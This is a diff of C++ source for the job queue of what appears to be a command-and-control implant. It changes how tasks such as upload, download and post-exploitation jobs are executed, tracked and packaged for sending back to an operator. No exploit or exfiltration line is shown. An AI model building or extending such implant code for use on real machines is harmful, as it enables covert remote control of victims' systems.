@@ -27,7 +27,7 @@ auto DECLFN Jobs::Create(
     NewJob->Psr      = JobPsr;
     NewJob->Pkg      = Self->Pkg->Create( NewJob->CmdID, UUID );
 
-    if ( !NewJob->Pkg ) {
+    if ( ! NewJob->Pkg ) {
         Self->Hp->Free( NewJob );
         Self->Hp->Free( JobPsr );
         return nullptr;
@@ -60,7 +60,7 @@ auto DECLFN Jobs::Send(
 
     while ( Current ) {
         if ( 
-            Current->State    == KH_JOB_RUNNING &&
+            Current->State    == KH_JOB_READY_SEND &&
             Current->ExitCode == EXIT_SUCCESS
         ) {
             KhDbg( "concatenating job: %s", Current->UUID );
@@ -71,8 +71,8 @@ auto DECLFN Jobs::Send(
             Self->Pkg->Pad( PostJobs, UC_PTR( Current->Pkg->Buffer ), Current->Pkg->Length );
             Current->State = KH_JOB_TERMINATE;
         } else if ( 
-            Current->State    == KH_JOB_RUNNING && 
-            Current->ExitCode != EXIT_SUCCESS   &&
+            Current->State    == KH_JOB_READY_SEND && 
+            Current->ExitCode != EXIT_SUCCESS      &&
             Current->ExitCode != -1
         ) {
             PCHAR Unknown  = "unknown error";
@@ -131,10 +131,6 @@ auto DECLFN Jobs::Cleanup( VOID ) -> VOID {
                 Current    = this->List;
             }
 
-            if ( ToRemove->Thread.Handle ) {
-                Self->Ntdll.NtClose( ToRemove->Thread.Handle );
-            }
-
             if ( ToRemove->Pkg ) {
                 Self->Pkg->Destroy( ToRemove->Pkg );
             }
@@ -157,22 +153,25 @@ auto DECLFN Jobs::ExecuteAll( VOID ) -> VOID {
     JOBS* Current = this->List;
 
     while ( Current ) {
-        if ( Current->State == KH_JOB_PRE_START ) {
+        if ( Current->State == KH_JOB_PRE_START || Current->State == KH_JOB_RUNNING ) {
             KhDbg( "executing task UUID : %s", Current->UUID );
             KhDbg( "executing command id: %d", Current->CmdID );
 
-            if ( 
-                Current->CmdID == Enm::Task::Upload   ||
-                Current->CmdID == Enm::Task::Download
-            ) {
-                Current->Thread.Handle = Self->Krnl32.CreateThread( 0, 0, (LPTHREAD_START_ROUTINE)&this->Execute, Current, 0, &Current->Thread.ID );
-            } else {
-                Current->State    = KH_JOB_RUNNING;
-                ERROR_CODE Result = this->Execute( Current );
-                Current->ExitCode = Result;
+            Current->State    = KH_JOB_RUNNING;
+            ERROR_CODE Result = this->Execute( Current );
+            Current->ExitCode = Result;
 
-                KhDbg( "job executed with exit code: %d", Current->ExitCode );
-            }    
+            KhDbg( "job executed with exit code: %d", Current->ExitCode );
+
+            if ( 
+                Current->CmdID == Enm::Task::Upload     ||
+                Current->CmdID == Enm::Task::Download   || 
+                Current->CmdID == Enm::Task::PostEx
+            ) {
+                Current = Current->Next; continue;
+            }
+
+            Current->State = KH_JOB_READY_SEND;
         }
 
         Current = Current->Next;
@@ -185,10 +184,13 @@ auto DECLFN Jobs::Execute(
     G_KHARON
 
     for ( INT i = 0; i < TSK_LENGTH; i++ ) {
-        if ( Job->CmdID == Self->Tk->Mgmt[i].ID ) {
-            return ( Self->Tk->*Self->Tk->Mgmt[i].Run )( Job );
+        if ( Job->CmdID == Self->Tsk->Mgmt[i].ID ) {
+            return ( Self->Tsk->*Self->Tsk->Mgmt[i].Run )( Job );
         }
     }
+
+    KhDbg("returning invalid task id");
+
     return -2; // KH_ERROR_INVALID_TASK_ID;
 }
 
